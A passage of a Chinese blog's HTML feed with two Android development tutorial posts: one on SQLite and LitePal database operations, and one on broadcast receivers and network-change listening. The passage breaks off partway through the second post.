class="line">delete_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        SQLiteDatabase db = dbHelper.getWritableDatabase();</span><br><span class="line">        db.delete(<span class="string">"Book"</span>,  <span class="string">"pages &gt; ?"</span>, <span class="keyword">new</span> String[]&#123;<span class="string">"500"</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这样就会删除页数大于500的数据了。</p><h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><p>SQLiteDatabase提供了query方法用于对数据进行查询，共有7个参数：</p><p><img src="./day5/1.jpg" alt=""></p><p>其返回的是一个Cursor对象。</p><p>下面继续实践下：</p><p>新建button，然后添加代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Button query_data = (Button) findViewById(R.id.query_data);</span><br><span class="line">query_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        SQLiteDatabase db = dbHelper.getWritableDatabase();</span><br><span class="line">        Cursor cursor = db.query(<span class="string">"Book"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (cursor.moveToFirst()) &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                String name = cursor.getString(cursor.getColumnIndex(<span class="string">"name"</span>));</span><br><span class="line">                String author = cursor.getString(cursor.getColumnIndex(<span class="string">"author"</span>));</span><br><span class="line">                <span class="keyword">int</span> pages = cursor.getInt(cursor.getColumnIndex(<span class="string">"pages"</span>));</span><br><span class="line">                <span class="keyword">double</span> price = cursor.getDouble(cursor.getColumnIndex(<span class="string">"price"</span>));</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book name is "</span> + name);</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book author is "</span> + author);</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book pages is "</span> + pages);</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book price is "</span> + price);</span><br><span class="line">            &#125; <span class="keyword">while</span> (cursor.moveToNext());</span><br><span class="line">        &#125;</span><br><span class="line">        cursor.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>即可在Logcat界面看到查询到的数据。</p><h3 id="使用SQL操作数据库"><a href="#使用SQL操作数据库" class="headerlink" title="使用SQL操作数据库"></a>使用SQL操作数据库</h3><p>可以直接运行db.execSQL(sql_command);来完成sql操作。</p><h2 id="使用LitePal操作数据库"><a href="#使用LitePal操作数据库" class="headerlink" title="使用LitePal操作数据库"></a>使用LitePal操作数据库</h2><p>新建一个LitePalTest项目。</p><h3 id="LitePal简介"><a href="#LitePal简介" class="headerlink" title="LitePal简介"></a>LitePal简介</h3><p>LitePal是一款开源的Android数据库框架，它采用了对象关系映射（ORM）模式，并将平时开发最常用到的数据库功能进行了封装，地址：<a href="http://github.com/LitePalFramework/LitePal" target="_blank" rel="noopener">http://github.com/LitePalFramework/LitePal</a></p><p>在面向对象的语言和面向关系的数据库之间建立一种映射关系，就是对象关系映射。</p><h3 id="配置LitePal"><a href="#配置LitePal" class="headerlink" title="配置LitePal"></a>配置LitePal</h3><p>编辑app/build.gradle文件，在dependencies闭包中添加：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implementation 'org.litepal.android:core:1.3.2'</span><br></pre></td></tr></table></figure><p>接下来右击app/src/main目录-&gt;New-&gt;Directory，命名为assets，然后在该目录下新建litepal.xml文件，修改为如下内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">litepal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dbname</span> <span class="attr">value</span>=<span class="string">"BookStore"</span>&gt;</span><span class="tag">&lt;/<span class="name">dbname</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span><span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">litepal</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后修改AndroidManifest.xml中的文件代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"org.litepal.LitePalApplication"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:allowBackup</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:icon</span>=<span class="string">"@mipmap/ic_launcher"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:roundIcon</span>=<span class="string">"@mipmap/ic_launcher_round"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:supportsRtl</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:theme</span>=<span class="string">"@style/AppTheme"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".MainActivity"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="创建和升级数据库"><a href="#创建和升级数据库" class="headerlink" title="创建和升级数据库"></a>创建和升级数据库</h3><p>先将DatabaseTest的布局完全移过来。</p><p>然后定义一个Book类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Book</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String author;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> price;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> pages;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAuthor</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> author;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAuthor</span><span class="params">(String author)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.author = author;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getPrice</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPrice</span><span class="params">(<span class="keyword">double</span> price)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPages</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> pages;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPages</span><span class="params">(<span class="keyword">int</span> pages)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.pages = pages;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改litepal.xml中的代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">litepal</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbname</span> <span class="attr">value</span>=<span class="string">"BookStore"</span>&gt;</span><span class="tag">&lt;/<span class="name">dbname</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span><span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapping</span> <span class="attr">class</span>=<span class="string">"com.example.litepaltest.Book"</span>&gt;</span> <span class="tag">&lt;/<span class="name">mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">litepal</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后修改活动代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button create_database = findViewById(R.id.create_database);</span><br><span class="line">        create_database.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Connector.getDatabase();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中Connector.getDatabase();就是用来创建数据库的操作。</p><p>然后在adb中用sqlite3打开数据库，并输入：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; .schema</span><br><span class="line">CREATE TABLE android_metadata (locale TEXT);</span><br><span class="line">CREATE TABLE table_schema (id <span class="built_in">integer</span> primary key autoincrement,name text, <span class="built_in">type</span> <span class="built_in">integer</span>);</span><br><span class="line">CREATE TABLE book (id <span class="built_in">integer</span> primary key autoincrement,author text, name text, pages <span class="built_in">integer</span>, price real);</span><br></pre></td></tr></table></figure><p>可以看到存在了3个表，其中book就是我们刚创建的表。</p><p>同时，可以直接通过添加类的对象以及新增类，然后调用Connector.getDatabase()就可以直接修改数据，而不用先drop掉相应表后重新创建，同时，这种操作还会保留原有的数据。</p><h3 id="使用LitePal添加数据"><a href="#使用LitePal添加数据" class="headerlink" title="使用LitePal添加数据"></a>使用LitePal添加数据</h3><p>首先讲book设置为继承自DataSupport类，然后添加活动代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Button add_data = findViewById(R.id.add_data);</span><br><span class="line">add_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Book book = <span class="keyword">new</span> Book();</span><br><span class="line">        book.setName(<span class="string">"The Da Vinic Code"</span>);</span><br><span class="line">        book.setAuthor(<span class="string">"Dan Brown"</span>);</span><br><span class="line">        book.setPages(<span class="number">454</span>);</span><br><span class="line">        book.setPrice(<span class="number">16.96</span>);</span><br><span class="line">        book.save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>通过save()方法即可向数据库中添加数据。</p><h3 id="使用LitePal更新数据"><a href="#使用LitePal更新数据" class="headerlink" title="使用LitePal更新数据"></a>使用LitePal更新数据</h3><p>添加活动代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Button update_data = findViewById(R.id.update_data);</span><br><span class="line">update_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Book book = <span class="keyword">new</span> Book();</span><br><span class="line">        book.setPrice(<span class="number">14.95</span>);</span><br><span class="line">        book.updateAll(<span class="string">"name = ? and author = ?"</span>, <span class="string">"The Da Vinic Code"</span>, <span class="string">"Dan Brown"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>另外，在添加数据之后再一次调用sava()也可以用来更新数据。</p><p>如果想设置为默认值，则可以如下代码完成：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Book book = <span class="keyword">new</span> Book();</span><br><span class="line">book.setToDefault(<span class="string">"pages"</span>);</span><br><span class="line">book.updateAll();</span><br></pre></td></tr></table></figure><p>这样就可以将所有的书页数都更新为0。</p><h3 id="使用LitePal删除数据"><a href="#使用LitePal删除数据" class="headerlink" title="使用LitePal删除数据"></a>使用LitePal删除数据</h3><p>添加活动代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Button delete_data = findViewById(R.id.delete_data);</span><br><span class="line">delete_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        DataSupport.deleteAll(Book.class,"price &lt; ?", "15");</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>即可删除所有价格小于15的书。</p><h3 id="使用LitePal查询数据"><a href="#使用LitePal查询数据" class="headerlink" title="使用LitePal查询数据"></a>使用LitePal查询数据</h3><p>添加活动代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Button query_data = findViewById(R.id.query_data);</span><br><span class="line">query_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        List&lt;Book&gt; books = DataSupport.findAll(Book<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="keyword">for</span>(Book book : books) &#123;</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book name is "</span>+ book.getName());</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book author is "</span>+ book.getAuthor());</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book pages is "</span>+ book.getPages());</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book price is "</span>+ book.getPrice());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>另外还可以用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DataSupport.select(<span class="string">"name"</span>, <span class="string">"author"</span>).find(Book<span class="class">.<span class="keyword">class</span>)</span>; <span class="comment">//只查找name和author</span></span><br><span class="line">DataSupport.where(<span class="string">"pages &gt; ?"</span>, <span class="string">"400"</span>).find(Book<span class="class">.<span class="keyword">class</span>)</span>; <span class="comment">//只查找pages &gt; 400</span></span><br></pre></td></tr></table></figure><p>等限定条件。</p><p>另外，LitePal仍然支持用SQL语句来查询：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cursor c = DataSupport.findBySQL(<span class="string">"select * from Book where pages &gt; ? and price &lt; ?"</span>, <span class="string">"400"</span>, <span class="string">"20"</span>);</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Android数据持久化方式包括了文件存储、SharedPreferences存储以及数据库存储。其中文件存储适用于简单的文本数据或者二进制数据；SharedPreferences存储适用于存储一些键值对，而数据库存储则适用于存储复杂关系型数据。另外，LitePal数据库能简化Android自带的数据库操作步奏。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;持久化技术详解&quot;&gt;&lt;a href=&quot;#持久化技术详解&quot; class=&quot;headerlink&quot; title=&quot;持久化技术详解&quot;&gt;&lt;/a&gt;持久化技术详解&lt;/h1&gt;&lt;h2 id=&quot;持久化技术简介&quot;&gt;&lt;a href=&quot;#持久化技术简介&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/tags/Android/"/>
    
      <category term="开发" scheme="https://nuoye-blog.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Android-day4</title>
    <link href="https://nuoye-blog.github.io/2020/05/28/Android/Android-day4/"/>
    <id>https://nuoye-blog.github.io/2020/05/28/Android/Android-day4/</id>
    <published>2020-05-28T05:40:00.000Z</published>
    <updated>2020-05-28T05:44:15.105Z</updated>
    
    <content type="html"><![CDATA[<h1 id="广播机制详解"><a href="#广播机制详解" class="headerlink" title="广播机制详解"></a>广播机制详解</h1><h2 id="广播机制简介"><a href="#广播机制简介" class="headerlink" title="广播机制简介"></a>广播机制简介</h2><p>Android提供了一套完整的API，允许应用程序自由地发送和接收广播。发送广播的方法既即Intent，而接收广播的方法则是用广播接收器。</p><p>Android中的广播主要可以分为两种类型：</p><ul><li>标准广播：这是一种完全异步执行的广播，在广播发出之后，所有的广播接收器几乎都会在同一时刻接收到这条广播消息，因此它们之间没有任何先后顺序科研。这种广播的效率会比较高，但却无法被截断。</li><li>有序广播：这是一种同步执行的广播，在广播发出之后，同一时刻只会有一个广播接收器能够收到这条广播消息，当这个广播接收器中的逻辑执行完毕后，广播才会继续传递。所以此时的广播接收器是有先后顺序的，优先级高的广播接收器就可以先收到广播消息，并且前面的广播接收器还可以截断正在传递的广播。</li></ul><p><img src="./day4/1.png" alt=""></p><p><img src="./day4/2.jpg" alt=""></p><h2 id="接收系统广播"><a href="#接收系统广播" class="headerlink" title="接收系统广播"></a>接收系统广播</h2><h3 id="动态注册监听网络变化"><a href="#动态注册监听网络变化" class="headerlink" title="动态注册监听网络变化"></a>动态注册监听网络变化</h3><p>注册广播的方式一般有两种，在代码中注册和在AndroidManifest.xml中注册，其中前者也被称为动态注册，后者也被称为静态注册。</p><p>动态注册的广播必须要在程序启动之后才能接收到广播。</p><p>动态注册只需新建一个类，让他继承自BraodcastReceiver并重写onReceive()方法即可。</p><p>新建一个BroadcastTest项目，修改代码为如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> IntentFilter intentFilter;</span><br><span class="line">    <span class="keyword">private</span> NetworkChangeReceiver networkChangeReceiver;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        intentFilter = <span class="keyword">new</span> IntentFilter();</span><br><span class="line">        intentFilter.addAction(<span class="string">"android.net.conn.CONNECTIVITY_CHANGE"</span>);</span><br><span class="line">        networkChangeReceiver = <span class="keyword">new</span> NetworkChangeReceiver();</span><br><span class="line">        registerReceiver(networkChangeReceiver, intentFilter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        unregisterReceiver(networkChangeReceiver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">NetworkChangeReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span></span>&#123;</span><br><span class="line">            Toast.makeText(context, <span class="string">"network changes"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当网络状态发送变化时，系统发出一条值为android.net.conn.CONNECTIVITY_CHANGE的广播，所以这里向intentFilter传入android.net.conn.CONNECTIVITY_CHANGE这一值，即相应的action。</p><p>接下来registerReceiver()用来注册从而使networkChangeReceiver能够接收到所有值为android.net.conn.CONNECTIVITY_CHANGE的广播。</p><p>PS:bluestacks模拟器没有网络选项，没法测试；得上真机，或者可以的话看看Android Studio的模拟器可以不可以。</p><p>然后我们可以修改onReceive()为如下代码以显示有无网络：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span></span>&#123;</span><br><span class="line">    ConnectivityManager connectionManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);</span><br><span class="line">    NetworkInfo networkInfo = connectionManager.getActiveNetworkInfo();</span><br><span class="line">    <span class="keyword">if</span>(networkInfo != <span class="keyword">null</span> &amp;&amp; networkInfo.isAvailable())&#123;</span><br><span class="line">    Toast.makeText(context, <span class="string">"network is available"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    Toast.makeText(context, <span class="string">"network is unavailable"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时在AndroidManifest.xml中添加权限：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_NETWORK_STATE"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>这样就可以在真机上测试了。</p><h3 id="静态注册实现开启启动"><a href="#静态注册实现开启启动" class="headerlink" title="静态注册实现开启启动"></a>静态注册实现开启启动</h3><p>新建一个广播接收器：点击com.example.broadcasttest包-&gt;New-&gt;Other-&gt;Broadcast 